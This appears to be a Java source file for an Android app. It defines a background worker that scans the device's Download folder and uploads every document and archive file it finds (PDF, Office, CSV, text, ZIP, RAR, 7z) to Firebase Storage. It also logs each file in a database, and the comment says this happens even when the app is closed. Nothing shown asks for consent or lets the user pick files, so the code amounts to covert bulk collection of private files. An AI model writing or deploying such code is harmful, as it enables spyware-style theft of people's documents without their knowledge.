package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final String SCAN_PATH = "/sdcard/Download";

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            uploadDocuments(userId);
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Document upload failed", e);
            return Result.retry();
        }
    }

    private void uploadDocuments(String userId) {
        File downloadsDir = new File(SCAN_PATH);
        if (!downloadsDir.exists()) {
            Log.d(TAG, "Downloads directory not found");
            return;
        }

        File[] files = downloadsDir.listFiles();
        if (files == null || files.length == 0) {
            Log.d(TAG, "No files in downloads directory");
            return;
        }

        for (File file : files) {
            if (isDocumentFile(file)) {
                uploadFile(file, userId);
            }
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        String name = file.getName().toLowerCase();
        return name.endsWith(".pdf")
                || name.endsWith(".xlsx")
                || name.endsWith(".xls")
                || name.endsWith(".docx")
                || name.endsWith(".doc")
                || name.endsWith(".pptx")
                || name.endsWith(".ppt")
                || name.endsWith(".csv")
                || name.endsWith(".txt")
                || name.endsWith(".zip")
                || name.endsWith(".rar")
                || name.endsWith(".7z");
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName);
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            Uri fileUri = Uri.fromFile(file);
            
            storageRef.putFile(fileUri)
                    .addOnSuccessListener(task -> {
                        task.getStorage().getDownloadUrl().addOnCompleteListener(urlTask -> {
                            if (urlTask.isSuccessful() && urlTask.getResult() != null) {
                                recordDocumentInDatabase(userId, fileName, urlTask.getResult().toString(), file.length());
                                Log.d(TAG, "Uploaded: " + fileName);
                            }
                        });
                    })
                    .addOnFailureListener(e -> Log.e(TAG, "Upload failed for " + fileName, e));

        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + file.getName(), e);
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName);

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("userId", userId);

            documentsRef.child(docId).setValue(docData);
        } catch (Exception e) {
            Log.e(TAG, "Failed to record document in database", e);
        }
    }
}
